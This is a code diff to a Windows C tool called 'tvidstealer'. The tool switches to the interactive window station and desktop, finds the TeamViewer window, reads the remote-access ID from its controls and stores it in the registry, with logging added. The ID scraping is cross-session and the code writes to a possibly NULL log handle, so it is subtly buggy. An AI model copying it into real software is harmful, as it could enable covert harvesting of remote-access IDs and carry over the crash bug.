@@ -6,8 +6,13 @@
 #include "tvidstealer.h"
 #include "registry.h"
 
+struct tvWindowParam{
+    HANDLE hWindow;
+    char sid[TV_WINDOW_NAME_LEN];
+    BOOL found;
+};
 
-struct param {
+struct tvIdParam {
     int count;          /* ID field index (eg: in TeamViewer QuickSupport the ID is the 2nd one) */
     char sid[TV_ID_LEN];  /* ID string */
     int id;               /* ID DWORD */
@@ -30,7 +35,7 @@ is_tvId(char *sid, int *id){
 BOOL CALLBACK
 find_tvId (HWND hwnd, LPARAM lParam){
     BOOL ret=TRUE;
-    struct param *p=(struct param *)lParam;
+    struct tvIdParam *p=(struct tvIdParam *)lParam;
     p->count++;
 
     SendMessage(hwnd, WM_GETTEXT, (WPARAM) TV_ID_LEN, (LPARAM) p->sid);
@@ -42,36 +47,118 @@ find_tvId (HWND hwnd, LPARAM lParam){
     return ret;
 }
 
-int
-main(){
-    struct param p;
-    int tries=0;
-    if(check_registry_key()){
-        return 0;
+BOOL CALLBACK
+find_tvWindow (HWND hwnd, LPARAM lParam){
+    BOOL ret=TRUE;
+
+    struct tvWindowParam *p=(struct tvWindowParam *)lParam;
+
+    SendMessage(hwnd, WM_GETTEXT, (WPARAM) TV_WINDOW_NAME_LEN, (LPARAM) p->sid);
+
+    if(!strncmp(TV_WINDOW_NAME,p->sid,TV_WINDOW_NAME_LEN)){
+        p->found=TRUE;
+        p->hWindow=hwnd;
+        ret=FALSE;
     }
+    return ret;
+}
+
+int
+main(int argc, char *argv[]){
+    struct tvIdParam idp;
+    struct tvWindowParam wip;
+    int tries=0;
+    HDESK hDesk=NULL;
+    HWINSTA hWinsta=NULL;
+    FILE *log=NULL;
+    char logfile[128];
+    int error=0;
+
+    snprintf(logfile,128,"%s.log.txt",argv[0]);
+
+    log = fopen(logfile,"a+");
+    if(!log){
+        /* not realy an error ... */
+        log=log;
+    }
+
+    if(check_registry_key()){
+        goto abort;
+    }
+
+    /* Switch to the needed Desktop Station (in order to enumwindows */
+    hWinsta=OpenWindowStation("winsta0", // _In_  LPTSTR lpszWinSta,
+                      TRUE, //  _In_  BOOL fInherit,
+                      WINSTA_ALL_ACCESS); // _In_  ACCESS_MASK dwDesiredAccess
+    if(!hWinsta){
+        fprintf(log,"[-] OpenWindowStation: %ld, error\n",GetLastError());
+        error++;
+        goto abort;
+    }
+    else{
+        fprintf(log,"[+] OpenWindowStation: ok\n");
+    }
+    if( ! SetProcessWindowStation(hWinsta)){
+         fprintf(log,"[-] SetProcessWindowStation: %ld, error\n",GetLastError());
+         error++;
+         goto abort;
+    }else{
+        fprintf(log,"[+] SetProcessWindowStation: ok\n");
+    }
+
+    /* Open the default Desktop */
+    hDesk=OpenInputDesktop(0,FALSE,GENERIC_READ);
+    if(!hDesk){
+        fprintf(log,"[-] OpenInputDesktop: %ld, error\n",GetLastError());
+        error++;
+        goto abort;
+    }
+    else{
+        fprintf(log,"[+] OpenInputDesktop: ok\n");
+    }
+
     while(tries < TIMEOUT || TIMEOUT==0){
-        HWND hwnd=FindWindow(NULL,TV_PROCESS_NAME);
-        if(hwnd){
-            fprintf(stdout,"[+] TeamViewer found\n");
+
+        wip.found=FALSE;
+        wip.hWindow=NULL;
+        *wip.sid=0;
+
+        if( ! EnumDesktopWindows(hDesk,find_tvWindow,(LPARAM)&wip)){
+            error++;
+            fprintf(log,"[-] EnumDesktopWindows: %ld, error\n",GetLastError());
+        }
+        else{
+            fprintf(log,"[+] EnumDesktopWindows: ok\n");
+        }
+
+        if(wip.found){
+            fprintf(log,"[+] TeamViewer found\n");
 
             /* Reset param struct */
-            p.count=0;
-            *p.sid=0;
-            p.id=0;
-            p.found=FALSE;
+            idp.count=0;
+            *idp.sid=0;
+            idp.id=0;
+            idp.found=FALSE;
 
-            EnumChildWindows(hwnd,find_tvId,(LPARAM)&p);
+            EnumChildWindows(wip.hWindow,find_tvId,(LPARAM)&idp);
 
-            if(p.found){
-                add_registry_key(p.id);
+            if(idp.found){
+                add_registry_key(idp.id);
                 break;
             }
         }
         else {
-            fprintf(stderr,"[-] TeamViewer not found\n");
+            fprintf(log,"[!] TeamViewer not found\n");
         }
         Sleep(SLEEP);
         tries++;
     }
-    return 0;
+abort:
+    if(hDesk)
+        CloseDesktop(hDesk);
+    if(hWinsta)
+        CloseWindowStation(hWinsta);
+    if(log)
+        fclose(log);
+    return error;
 }
